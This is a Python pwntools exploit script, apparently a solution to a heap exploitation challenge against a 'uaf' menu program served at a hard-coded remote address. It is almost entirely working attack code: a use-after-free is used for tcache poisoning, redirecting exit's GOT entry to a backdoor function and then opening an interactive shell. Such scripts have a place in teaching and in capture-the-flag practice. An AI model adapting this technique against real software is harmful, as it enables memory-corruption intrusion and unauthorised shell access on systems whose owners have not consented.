from pwn import *

context.log_level = 'DEBUG'


def add_ddl(time, content):
    p.recvuntil("Your chocie:\n")
    p.sendline("1")
    p.recvuntil("the ddl time\n")
    p.sendline(time)
    p.recvuntil("the ddl content")
    p.sendline(content) 

def free_ddl(index):
    p.recvuntil("Your chocie:\n")
    p.sendline("2")
    p.recvuntil("the ddl index")
    p.sendline(index)

def edit_ddl(index, time, content):
    p.recvuntil("Your chocie:\n")
    p.sendline("4")
    p.recvuntil("the ddl index")
    p.sendline(index)
    p.recvuntil("new ddl time")
    p.sendline(time)
    p.recvuntil("new ddl content")
    p.sendline(content)

local = 0
exit_got = 0x0602078
backdoor_addr = 0x400917

if local:
    p = process('./uaf', env={'LD_LIBRARY_PATH':'.'})
else:
    p = remote("47.99.80.189", 10030)
    libc = ELF('libc-2.27.so')
    p.recvuntil('ID:')
    p.sendline('3180103650')

raw_input()

# 1. malloc 3 ddls: A, B and C
add_ddl("11.11", "ddl_1")
add_ddl("22.22", "ddl_2")
add_ddl("33.33", "ddl_3")

# 2. free 2 ddls: A and B
free_ddl("1")
free_ddl("2")

# 3. pollute B's fd -> GOT of exit()
edit_ddl("2", p64(exit_got), "SSS")

# 4. malloc B -> write GOT of exit()
add_ddl("22.22", "ddl_1")
add_ddl(p64(backdoor_addr), "ddl_2")

# 5. exit() -> backdoor()
p.recvuntil("Your chocie:\n")
p.sendline("5")
p.recv()
p.interactive()

